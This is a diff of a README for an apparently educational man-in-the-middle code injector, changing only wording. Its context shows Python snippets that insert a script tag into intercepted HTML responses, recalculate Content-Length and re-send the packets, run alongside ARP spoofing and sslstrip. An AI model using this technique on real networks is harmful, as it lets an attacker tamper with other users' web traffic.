@@ -35,7 +35,7 @@ Therefore the problem when the target make the requests is done, now when the pr
    injection_code = "<script>alert('CODE INJECTOR SUCCSSESFULLY DONE')</script>"
    load = load.replace("</body>", injection_code + "</body>")
 ```
-Other importants details is change the length of the page because when a page is sent to someone it has a length and how it was changed because of the injecting code we have to change the verify if the load have the field content_length and recalculate the length adding the length of the injected code. 
+Other importants details is change the length of the page because when a page is sent to someone it has a length and how it was changed because of the injecting code we have to change and verify if the load have the field content_length and recalculate the length adding the length of the injected code.
 ```python
    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
@@ -43,12 +43,12 @@ Other importants details is change the length of the page because when a page is
                 new_content_length = int(content_length) + len(injection_code)
                 load = load.replace(content_length, str(new_content_length))
 ```
-Lastly but not least how the format of the packet was change to a scapy packet we have to take the packet and turn into a orginal packet.
+Lastly but not least how the format of the packet was change to a scapy packet we have to take the packet and turn into a orginal packet again.
 ```python 
    new_packet = set_load(scapy_packet, load)
    packet.set_payload(str(new_packet))
 ```
-This way the progam is runned on the bottom left side are the packets from the Arp_spoof being sent, on the top right side are the code_injector.py showing when requests ad responses are made, the other it's the sslstrip running.
+This way the progam is runned, on the bottom left side are the packets from the Arp_spoof being sent, on the top right side are the code_injector.py showing when requests ad responses are made, the other it's the sslstrip running.
 
 <img src="termInjector.png">
 
